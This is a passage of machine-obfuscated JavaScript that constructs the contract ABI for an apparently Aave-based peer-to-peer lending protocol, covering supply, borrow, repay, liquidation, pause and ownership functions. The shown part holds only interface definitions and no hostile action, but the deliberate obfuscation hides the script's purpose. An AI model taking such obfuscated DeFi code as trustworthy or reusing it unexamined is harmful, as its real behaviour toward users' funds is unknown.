            indexed: true,
            internalType: "address",
            name: "_exitPositionsManager",
            type: "address"
          };
          const _0x35b94f = {
            anonymous: false,
            inputs: [_0x1461ac],
            name: "ExitPositionsManagerSet",
            type: 'event'
          };
          const _0x5c8f4f = {
            indexed: true,
            internalType: "address",
            name: "_interestRatesManager",
            type: "address"
          };
          const _0x10639b = {
            anonymous: false,
            inputs: [_0x5c8f4f],
            name: "InterestRatesSet",
            type: 'event'
          };
          const _0x25268c = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x15f791 = {
            indexed: false,
            internalType: 'bool',
            name: "_isPaused",
            type: "bool"
          };
          const _0x4e8141 = {
            anonymous: false,
            inputs: [_0x25268c, _0x15f791],
            name: "IsBorrowPausedSet",
            type: 'event'
          };
          const _0x4a4a89 = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x5253ea = {
            indexed: false,
            internalType: 'bool',
            name: "_isDeprecated",
            type: "bool"
          };
          const _0x34d3a0 = {
            anonymous: false,
            inputs: [_0x4a4a89, _0x5253ea],
            name: "IsDeprecatedSet",
            type: 'event'
          };
          const _0x12855c = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: 'address'
          };
          const _0x158a8e = {
            indexed: false,
            internalType: 'bool',
            name: "_isPaused",
            type: "bool"
          };
          const _0x265e1c = {
            anonymous: false,
            inputs: [_0x12855c, _0x158a8e],
            name: "IsLiquidateBorrowPausedSet",
            type: "event"
          };
          const _0x2ec3e4 = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x16f407 = {
            indexed: false,
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x1e8870 = {
            anonymous: false,
            inputs: [_0x2ec3e4, _0x16f407],
            name: "IsLiquidateCollateralPausedSet",
            type: "event"
          };
          const _0x443a35 = {
            indexed: true,
            internalType: "address",
            name: "_poolToken",
            type: "address"
          };
          const _0x143e64 = {
            indexed: false,
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x40ed36 = {
            anonymous: false,
            inputs: [_0x443a35, _0x143e64],
            name: "IsRepayPausedSet",
            type: 'event'
          };
          const _0x4bfbc8 = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x3a9206 = {
            indexed: false,
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0xf7a50a = {
            anonymous: false,
            inputs: [_0x4bfbc8, _0x3a9206],
            name: "IsSupplyPausedSet",
            type: 'event'
          };
          const _0x39c164 = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0xa5dd24 = {
            indexed: false,
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x25d87d = {
            anonymous: false,
            inputs: [_0x39c164, _0xa5dd24],
            name: "IsWithdrawPausedSet",
            type: 'event'
          };
          const _0x1274b2 = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x38a94a = {
            indexed: false,
            internalType: "uint16",
            name: "_reserveFactor",
            type: "uint16"
          };
          const _0x471d41 = {
            indexed: false,
            internalType: "uint16",
            name: "_p2pIndexCursor",
            type: "uint16"
          };
          const _0xf644a7 = {
            anonymous: false,
            inputs: [_0x1274b2, _0x38a94a, _0x471d41],
            name: "MarketCreated",
            type: 'event'
          };
          const _0x576e5f = {
            indexed: false,
            internalType: 'uint256',
            name: "_newValue",
            type: 'uint256'
          };
          const _0x149f94 = {
            anonymous: false,
            inputs: [_0x576e5f],
            name: "MaxSortedUsersSet",
            type: 'event'
          };
          const _0x341aa2 = {
            indexed: true,
            internalType: "address",
            name: "previousOwner",
            type: "address"
          };
          const _0x1c5a09 = {
            indexed: true,
            internalType: "address",
            name: "newOwner",
            type: "address"
          };
          const _0x2a118b = {
            anonymous: false,
            inputs: [_0x341aa2, _0x1c5a09],
            name: "OwnershipTransferred",
            type: 'event'
          };
          const _0x396f2f = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x22f94a = {
            indexed: false,
            internalType: "uint16",
            name: "_newValue",
            type: "uint16"
          };
          const _0x26a92a = {
            anonymous: false,
            inputs: [_0x396f2f, _0x22f94a],
            name: "P2PIndexCursorSet",
            type: 'event'
          };
          const _0x4cbd75 = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x412312 = {
            indexed: false,
            internalType: "bool",
            name: "_isP2PDisabled",
            type: "bool"
          };
          const _0xf40fba = {
            anonymous: false,
            inputs: [_0x4cbd75, _0x412312],
            name: "P2PStatusSet",
            type: 'event'
          };
          const _0x1edb7f = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x4f7c51 = {
            indexed: false,
            internalType: "uint16",
            name: "_newValue",
            type: "uint16"
          };
          const _0x47f56d = {
            anonymous: false,
            inputs: [_0x1edb7f, _0x4f7c51],
            name: "ReserveFactorSet",
            type: "event"
          };
          const _0x291d6b = {
            indexed: true,
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x3da19e = {
            indexed: false,
            internalType: 'uint256',
            name: "_amountClaimed",
            type: "uint256"
          };
          const _0x1f1cee = {
            anonymous: false,
            inputs: [_0x291d6b, _0x3da19e],
            name: "ReserveFeeClaimed",
            type: 'event'
          };
          const _0x52c5ba = {
            indexed: true,
            internalType: "address",
            name: "_newTreasuryVaultAddress",
            type: "address"
          };
          const _0x3ec371 = {
            anonymous: false,
            inputs: [_0x52c5ba],
            name: "TreasuryVaultSet",
            type: 'event'
          };
          const _0x2810cf = {
            internalType: "bytes32",
            name: '',
            type: "bytes32"
          };
          const _0x5be275 = {
            inputs: [],
            name: "BORROWING_MASK",
            outputs: [_0x2810cf],
            stateMutability: "view",
            type: 'function'
          };
          const _0x137ddd = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x2b49a5 = {
            inputs: [],
            name: "DEFAULT_LIQUIDATION_CLOSE_FACTOR",
            outputs: [_0x137ddd],
            stateMutability: "view",
            type: "function"
          };
          const _0xe570fc = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x49ef4b = {
            inputs: [],
            name: "HEALTH_FACTOR_LIQUIDATION_THRESHOLD",
            outputs: [_0xe570fc],
            stateMutability: "view",
            type: "function"
          };
          const _0x43b902 = {
            inputs: [],
            name: "MAX_BASIS_POINTS",
            outputs: [{
              'internalType': "uint16",
              'name': '',
              'type': "uint16"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x43e26e = {
            internalType: "uint256",
            name: '',
            type: 'uint256'
          };
          const _0x35ed67 = {
            inputs: [],
            name: "MAX_NB_OF_MARKETS",
            outputs: [_0x43e26e],
            stateMutability: "view",
            type: "function"
          };
          const _0x47dec0 = {
            inputs: [],
            name: "NO_REFERRAL_CODE",
            outputs: [{
              'internalType': "uint8",
              'name': '',
              'type': "uint8"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x16051a = {
            inputs: [],
            name: "ONE",
            outputs: [{
              'internalType': "bytes32",
              'name': '',
              'type': "bytes32"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x15061e = {
            internalType: "address",
            name: '',
            type: 'address'
          };
          const _0x5315f3 = {
            inputs: [],
            name: "ST_ETH",
            outputs: [_0x15061e],
            stateMutability: "view",
            type: "function"
          };
          const _0x47945c = {
            inputs: [],
            name: "ST_ETH_BASE_REBASE_INDEX",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3341e8 = {
            inputs: [],
            name: "VARIABLE_INTEREST_MODE",
            outputs: [{
              'internalType': "uint8",
              'name': '',
              'type': "uint8"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4e7cae = {
            inputs: [],
            name: "aaveIncentivesController",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2a87d4 = {
            internalType: "contract ILendingPoolAddressesProvider",
            name: '',
            type: 'address'
          };
          const _0x3973cd = {
            inputs: [],
            name: "addressesProvider",
            outputs: [_0x2a87d4],
            stateMutability: "view",
            type: "function"
          };
          const _0xcab3e2 = {
            internalType: "address",
            name: "_poolToken",
            type: "address"
          };
          const _0x16e259 = {
            internalType: 'uint256',
            name: "_amount",
            type: 'uint256'
          };
          const _0xec4222 = {
            inputs: [_0xcab3e2, _0x16e259],
            name: 'borrow',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2022f6 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x2994e3 = {
            internalType: "uint256",
            name: "_amount",
            type: "uint256"
          };
          const _0xd5a708 = {
            internalType: 'uint256',
            name: "_maxGasForMatching",
            type: 'uint256'
          };
          const _0x169df1 = {
            inputs: [_0x2022f6, _0x2994e3, _0xd5a708],
            name: "borrow",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3b9aef = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x315515 = {
            internalType: 'address',
            name: '',
            type: "address"
          };
          const _0x1e282e = {
            inputs: [_0x3b9aef, _0x315515],
            name: "borrowBalanceInOf",
            outputs: [{
              'internalType': 'uint256',
              'name': 'inP2P',
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "onPool",
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4d0a55 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x291ca1 = {
            inputs: [_0x4d0a55],
            name: 'borrowMask',
            outputs: [{
              'internalType': "bytes32",
              'name': '',
              'type': 'bytes32'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xd187b2 = {
            internalType: "address[]",
            name: '',
            type: "address[]"
          };
          const _0x511a81 = {
            internalType: "bool",
            name: '',
            type: "bool"
          };
          const _0x354f67 = {
            inputs: [_0xd187b2, _0x511a81],
            name: "claimRewards",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x8098d7 = {
            internalType: "address[]",
            name: "_poolTokens",
            type: "address[]"
          };
          const _0x2bcdd4 = {
            internalType: 'uint256[]',
            name: "_amounts",
            type: 'uint256[]'
          };
          const _0x1ee130 = {
            inputs: [_0x8098d7, _0x2bcdd4],
            name: "claimToTreasury",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1814ef = {
            internalType: "address",
            name: "_underlyingToken",
            type: "address"
          };
          const _0x593dc3 = {
            internalType: "uint16",
            name: "_reserveFactor",
            type: "uint16"
          };
          const _0x130ac1 = {
            internalType: "uint16",
            name: "_p2pIndexCursor",
            type: "uint16"
          };
          const _0x492ec1 = {
            inputs: [_0x1814ef, _0x593dc3, _0x130ac1],
            name: "createMarket",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x3b218c = {
            internalType: "uint64",
            name: 'supply',
            type: "uint64"
          };
          const _0x1158d5 = {
            internalType: "uint64",
            name: 'borrow',
            type: "uint64"
          };
          const _0x23d6ca = {
            internalType: "uint64",
            name: "withdraw",
            type: "uint64"
          };
          const _0x2d78a4 = {
            internalType: "uint64",
            name: 'repay',
            type: 'uint64'
          };
          const _0x2e5dfd = {
            inputs: [],
            name: "defaultMaxGasForMatching",
            outputs: [_0x3b218c, _0x1158d5, _0x23d6ca, _0x2d78a4],
            stateMutability: "view",
            type: "function"
          };
          const _0x59fc96 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x58b4b1 = {
            inputs: [_0x59fc96],
            name: "deltas",
            outputs: [{
              'internalType': 'uint256',
              'name': "p2pSupplyDelta",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "p2pBorrowDelta",
              'type': "uint256"
            }, {
              'internalType': "uint256",
              'name': "p2pSupplyAmount",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "p2pBorrowAmount",
              'type': "uint256"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x539f40 = {
            internalType: "contract IEntryPositionsManager",
            name: '',
            type: "address"
          };
          const _0x552da3 = {
            inputs: [],
            name: "entryPositionsManager",
            outputs: [_0x539f40],
            stateMutability: "view",
            type: "function"
          };
          const _0x3b2fa3 = {
            inputs: [],
            name: "exitPositionsManager",
            outputs: [{
              'internalType': "contract IExitPositionsManager",
              'name': '',
              'type': 'address'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3c47b3 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x53eb86 = {
            internalType: "enum Types.PositionType",
            name: "_positionType",
            type: "uint8"
          };
          const _0x38ca87 = {
            inputs: [_0x3c47b3, _0x53eb86],
            name: "getHead",
            outputs: [{
              'internalType': "address",
              'name': "head",
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x572b30 = {
            inputs: [],
            name: "getMarketsCreated",
            outputs: [{
              'internalType': "address[]",
              'name': '',
              'type': "address[]"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x181460 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x2424e5 = {
            internalType: "enum Types.PositionType",
            name: "_positionType",
            type: "uint8"
          };
          const _0x4a1a3f = {
            internalType: "address",
            name: "_user",
            type: "address"
          };
          const _0x520c33 = {
            inputs: [_0x181460, _0x2424e5, _0x4a1a3f],
            name: "getNext",
            outputs: [{
              'internalType': "address",
              'name': "next",
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x1e488b = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x41ce4e = {
            inputs: [],
            name: "incentivesVault",
            outputs: [_0x1e488b],
            stateMutability: "view",
            type: "function"
          };
          const _0x1c6460 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x89022b = {
            internalType: "uint256",
            name: "_amount",
            type: 'uint256'
          };
          const _0x16a5ae = {
            inputs: [_0x1c6460, _0x89022b],
            name: "increaseP2PDeltas",
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x218f4a = {
            internalType: "contract IEntryPositionsManager",
            name: "_entryPositionsManager",
            type: "address"
          };
          const _0x406971 = {
            internalType: "contract IExitPositionsManager",
            name: "_exitPositionsManager",
            type: "address"
          };
          const _0xd80b2e = {
            internalType: "contract IInterestRatesManager",
            name: "_interestRatesManager",
            type: "address"
          };
          const _0x1d1c89 = {
            internalType: "contract ILendingPoolAddressesProvider",
            name: "_lendingPoolAddressesProvider",
            type: "address"
          };
          const _0x4ddaa2 = {
            internalType: "uint64",
            name: 'supply',
            type: "uint64"
          };
          const _0x2e66ae = {
            internalType: "uint64",
            name: 'borrow',
            type: "uint64"
          };
          const _0x244bc6 = {
            internalType: "uint64",
            name: "withdraw",
            type: "uint64"
          };
          const _0x15b78c = {
            internalType: "uint64",
            name: "repay",
            type: "uint64"
          };
          const _0x4bb3c3 = {
            components: [_0x4ddaa2, _0x2e66ae, _0x244bc6, _0x15b78c],
            internalType: "struct Types.MaxGasForMatching",
            name: "_defaultMaxGasForMatching",
            type: "tuple"
          };
          const _0x3280c3 = {
            internalType: 'uint256',
            name: "_maxSortedUsers",
            type: 'uint256'
          };
          const _0x2590ed = {
            inputs: [_0x218f4a, _0x406971, _0xd80b2e, _0x1d1c89, _0x4bb3c3, _0x3280c3],
            name: "initialize",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x295d05 = {
            inputs: [],
            name: "interestRatesManager",
            outputs: [{
              'internalType': "contract IInterestRatesManager",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4a8b80 = {
            inputs: [],
            name: "isClaimRewardsPaused",
            outputs: [{
              'internalType': "bool",
              'name': '',
              'type': "bool"
            }],
            stateMutability: 'view',
            type: "function"
          };
          const _0x599505 = {
            internalType: "address",
            name: "_poolTokenBorrowed",
            type: "address"
          };
          const _0x29c650 = {
            internalType: "address",
            name: "_poolTokenCollateral",
            type: "address"
          };
          const _0x59cf87 = {
            internalType: "address",
            name: "_borrower",
            type: "address"
          };
          const _0x1bf1f8 = {
            internalType: 'uint256',
            name: "_amount",
            type: 'uint256'
          };
          const _0x101863 = {
            inputs: [_0x599505, _0x29c650, _0x59cf87, _0x1bf1f8],
            name: "liquidate",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x633e18 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x5da3d3 = {
            inputs: [_0x633e18],
            name: "market",
            outputs: [{
              'internalType': 'address',
              'name': "underlyingToken",
              'type': "address"
            }, {
              'internalType': "uint16",
              'name': "reserveFactor",
              'type': "uint16"
            }, {
              'internalType': "uint16",
              'name': "p2pIndexCursor",
              'type': "uint16"
            }, {
              'internalType': 'bool',
              'name': "isCreated",
              'type': "bool"
            }, {
              'internalType': "bool",
              'name': 'isPaused',
              'type': "bool"
            }, {
              'internalType': "bool",
              'name': "isPartiallyPaused",
              'type': "bool"
            }, {
              'internalType': "bool",
              'name': "isP2PDisabled",
              'type': "bool"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3deca2 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x4a81ce = {
            internalType: "bool",
            name: "isSupplyPaused",
            type: "bool"
          };
          const _0x19c379 = {
            internalType: "bool",
            name: "isBorrowPaused",
            type: "bool"
          };
          const _0x1cd19a = {
            internalType: "bool",
            name: "isWithdrawPaused",
            type: "bool"
          };
          const _0x59fdaf = {
            internalType: "bool",
            name: "isRepayPaused",
            type: "bool"
          };
          const _0x3a9589 = {
            internalType: "bool",
            name: "isLiquidateCollateralPaused",
            type: "bool"
          };
          const _0x1d22cd = {
            internalType: "bool",
            name: "isLiquidateBorrowPaused",
            type: "bool"
          };
          const _0x1a5381 = {
            internalType: "bool",
            name: "isDeprecated",
            type: "bool"
          };
          const _0x2d1419 = {
            inputs: [_0x3deca2],
            name: "marketPauseStatus",
            outputs: [_0x4a81ce, _0x19c379, _0x1cd19a, _0x59fdaf, _0x3a9589, _0x1d22cd, _0x1a5381],
            stateMutability: "view",
            type: "function"
          };
          const _0x22c336 = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x56c293 = {
            inputs: [],
            name: "maxSortedUsers",
            outputs: [_0x22c336],
            stateMutability: "view",
            type: "function"
          };
          const _0x2da05d = {
            inputs: [],
            name: "owner",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xc55c9b = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x1ac7a1 = {
            inputs: [_0xc55c9b],
            name: "p2pBorrowIndex",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x182f68 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x48afc2 = {
            internalType: "uint256",
            name: '',
            type: 'uint256'
          };
          const _0xfba702 = {
            inputs: [_0x182f68],
            name: "p2pSupplyIndex",
            outputs: [_0x48afc2],
            stateMutability: "view",
            type: 'function'
          };
          const _0x4cfc0c = {
            inputs: [],
            name: "pool",
            outputs: [{
              'internalType': "contract ILendingPool",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x5783e9 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x5d18d9 = {
            inputs: [_0x5783e9],
            name: "poolIndexes",
            outputs: [{
              'internalType': "uint32",
              'name': "lastUpdateTimestamp",
              'type': "uint32"
            }, {
              'internalType': 'uint112',
              'name': "poolSupplyIndex",
              'type': 'uint112'
            }, {
              'internalType': 'uint112',
              'name': "poolBorrowIndex",
              'type': 'uint112'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x494efb = {
            inputs: [],
            name: "renounceOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3e24fe = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x20cdc7 = {
            internalType: "address",
            name: "_onBehalf",
            type: "address"
          };
          const _0x27c81c = {
            internalType: 'uint256',
            name: '_amount',
            type: 'uint256'
          };
          const _0x3f71f4 = {
            inputs: [_0x3e24fe, _0x20cdc7, _0x27c81c],
            name: 'repay',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x43465e = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0xaa8be8 = {
            internalType: 'uint256',
            name: "_amount",
            type: 'uint256'
          };
          const _0x29ffda = {
            inputs: [_0x43465e, _0xaa8be8],
            name: 'repay',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x44ac12 = {
            inputs: [],
            name: "rewardsManager",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x351219 = {
            internalType: "uint64",
            name: 'supply',
            type: "uint64"
          };
          const _0x3d272a = {
            internalType: "uint64",
            name: 'borrow',
            type: "uint64"
          };
          const _0x1a553b = {
            internalType: "uint64",
            name: 'withdraw',
            type: "uint64"
          };
          const _0x2e30cb = {
            internalType: "uint64",
            name: "repay",
            type: "uint64"
          };
          const _0x580098 = {
            components: [_0x351219, _0x3d272a, _0x1a553b, _0x2e30cb],
            internalType: "struct Types.MaxGasForMatching",
            name: "_defaultMaxGasForMatching",
            type: 'tuple'
          };
          const _0x13c489 = {
            inputs: [_0x580098],
            name: "setDefaultMaxGasForMatching",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x445ea7 = {
            internalType: "contract IEntryPositionsManager",
            name: "_entryPositionsManager",
            type: "address"
          };
          const _0x2306a4 = {
            inputs: [_0x445ea7],
            name: "setEntryPositionsManager",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x25ee6a = {
            internalType: "contract IExitPositionsManager",
            name: "_exitPositionsManager",
            type: "address"
          };
          const _0x4b6d40 = {
            inputs: [_0x25ee6a],
            name: "setExitPositionsManager",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x169011 = {
            internalType: "contract IInterestRatesManager",
            name: "_interestRatesManager",
            type: "address"
          };
          const _0x1a0bf9 = {
            inputs: [_0x169011],
            name: "setInterestRatesManager",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x31f715 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x207083 = {
            internalType: "bool",
            name: '_isPaused',
            type: "bool"
          };
          const _0x4de43a = {
            inputs: [_0x31f715, _0x207083],
            name: "setIsBorrowPaused",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1b6ebe = {
            internalType: "address",
            name: "_poolToken",
            type: 'address'
          };
          const _0xe5e311 = {
            internalType: "bool",
            name: "_isDeprecated",
            type: "bool"
          };
          const _0x3e59d2 = {
            inputs: [_0x1b6ebe, _0xe5e311],
            name: "setIsDeprecated",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x29d892 = {
            internalType: "address",
            name: "_poolToken",
            type: "address"
          };
          const _0x5a15f4 = {
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x93512c = {
            inputs: [_0x29d892, _0x5a15f4],
            name: "setIsLiquidateBorrowPaused",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x387e42 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x2f3667 = {
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x57883d = {
            inputs: [_0x387e42, _0x2f3667],
            name: "setIsLiquidateCollateralPaused",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4dd637 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x2c39b3 = {
            internalType: "bool",
            name: "_isP2PDisabled",
            type: "bool"
          };
          const _0x2897eb = {
            inputs: [_0x4dd637, _0x2c39b3],
            name: "setIsP2PDisabled",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x17ff80 = {
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x52894c = {
            inputs: [_0x17ff80],
            name: "setIsPausedForAllMarkets",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3812e5 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x15634d = {
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x41db0a = {
            inputs: [_0x3812e5, _0x15634d],
            name: "setIsRepayPaused",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2432a2 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x1e8877 = {
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0xd699f0 = {
            inputs: [_0x2432a2, _0x1e8877],
            name: "setIsSupplyPaused",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x222fc7 = {
            internalType: "address",
            name: "_poolToken",
            type: "address"
          };
          const _0x5c6bd0 = {
            internalType: "bool",
            name: "_isPaused",
            type: "bool"
          };
          const _0x4980f9 = {
            inputs: [_0x222fc7, _0x5c6bd0],
            name: "setIsWithdrawPaused",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x49fefb = {
            internalType: 'uint256',
            name: "_newMaxSortedUsers",
            type: 'uint256'
          };
          const _0x2e70ba = {
            inputs: [_0x49fefb],
            name: "setMaxSortedUsers",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x295491 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x179746 = {
            internalType: "uint16",
            name: "_p2pIndexCursor",
            type: "uint16"
          };
          const _0x2fcc22 = {
            inputs: [_0x295491, _0x179746],
            name: "setP2PIndexCursor",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2a139b = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x100979 = {
            internalType: "uint16",
            name: "_newReserveFactor",
            type: "uint16"
          };
          const _0x577bc7 = {
            inputs: [_0x2a139b, _0x100979],
            name: "setReserveFactor",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x318500 = {
            internalType: "address",
            name: "_treasuryVault",
            type: "address"
          };
          const _0x311aaf = {
            inputs: [_0x318500],
            name: "setTreasuryVault",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x24ed00 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x1eafcf = {
            internalType: "address",
            name: "_onBehalf",
            type: "address"
          };
          const _0x2d2404 = {
            internalType: "uint256",
            name: "_amount",
            type: 'uint256'
          };
          const _0x550abe = {
            inputs: [_0x24ed00, _0x1eafcf, _0x2d2404],
            name: 'supply',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xc607eb = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x3c5744 = {
            internalType: "uint256",
            name: "_amount",
            type: 'uint256'
          };
          const _0x470c10 = {
            inputs: [_0xc607eb, _0x3c5744],
            name: 'supply',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1b741d = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0xc77865 = {
            internalType: "address",
            name: "_onBehalf",
            type: "address"
          };
          const _0x5affb9 = {
            internalType: 'uint256',
            name: "_amount",
            type: 'uint256'
          };
          const _0x488c1d = {
            internalType: 'uint256',
            name: "_maxGasForMatching",
            type: 'uint256'
          };
          const _0x21d282 = {
            inputs: [_0x1b741d, _0xc77865, _0x5affb9, _0x488c1d],
            name: "supply",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x525c49 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x3322ed = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x495b88 = {
            internalType: 'uint256',
            name: "inP2P",
            type: 'uint256'
          };
          const _0x1d74b7 = {
            internalType: 'uint256',
            name: "onPool",
            type: 'uint256'
          };
          const _0x175d5d = {
            inputs: [_0x525c49, _0x3322ed],
            name: "supplyBalanceInOf",
            outputs: [_0x495b88, _0x1d74b7],
            stateMutability: "view",
            type: "function"
          };
          const _0x4f7351 = {
            internalType: "address",
            name: 'newOwner',
            type: "address"
          };
          const _0x10b9f4 = {
            inputs: [_0x4f7351],
            name: "transferOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x559c4f = {
            inputs: [],
            name: "treasuryVault",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x590153 = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x43b7de = {
            inputs: [_0x590153],
            name: "updateIndexes",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x29efda = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x3a3043 = {
            inputs: [_0x29efda],
            name: "userMarkets",
            outputs: [{
              'internalType': "bytes32",
              'name': '',
              'type': "bytes32"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x11439a = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x13d9d3 = {
            internalType: 'uint256',
            name: "_amount",
            type: 'uint256'
          };
          const _0x3fce81 = {
            internalType: "address",
            name: "_receiver",
            type: "address"
          };
          const _0x29b2fb = {
